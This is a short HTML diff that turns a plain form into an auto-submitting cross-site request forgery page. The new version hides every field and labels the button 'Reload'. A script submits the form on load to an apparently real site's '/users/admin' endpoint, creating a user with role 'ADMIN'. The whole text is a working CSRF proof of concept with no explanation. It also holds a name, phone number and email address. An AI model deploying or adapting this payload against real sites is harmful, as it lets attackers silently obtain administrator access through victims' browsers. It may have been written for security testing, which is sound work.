@@ -1,8 +1,16 @@
-<form action="https://nukepc.in/users/admin" method="POST">
-  <input type="text" name="firstName" value="kumar">
-  <input type="text" name="lastName" value="ram">
-  <input type="text" name="mobile" value="9994501667">
-  <input type="email" name="email" value="soavglucky@mediaeawst.uk">
-  <input type="text" name="role" value="ADMIN">
-  <input type="submit">
+<html>
+<body>
+<form id="f" action="https://nukepc.in/users/admin" method="POST">
+  <input type="hidden" name="firstName" value="kumar">
+  <input type="hidden" name="lastName" value="ram">
+  <input type="hidden" name="mobile" value="9994501667">
+  <input type="hidden" name="email" value="soavglucky@mediaeast.uk">
+  <input type="hidden" name="role" value="ADMIN">
+  <input type="submit" value="Reload">
 </form>
+
+<script>
+document.getElementById("f").submit();
+</script>
+</body>
+</html>
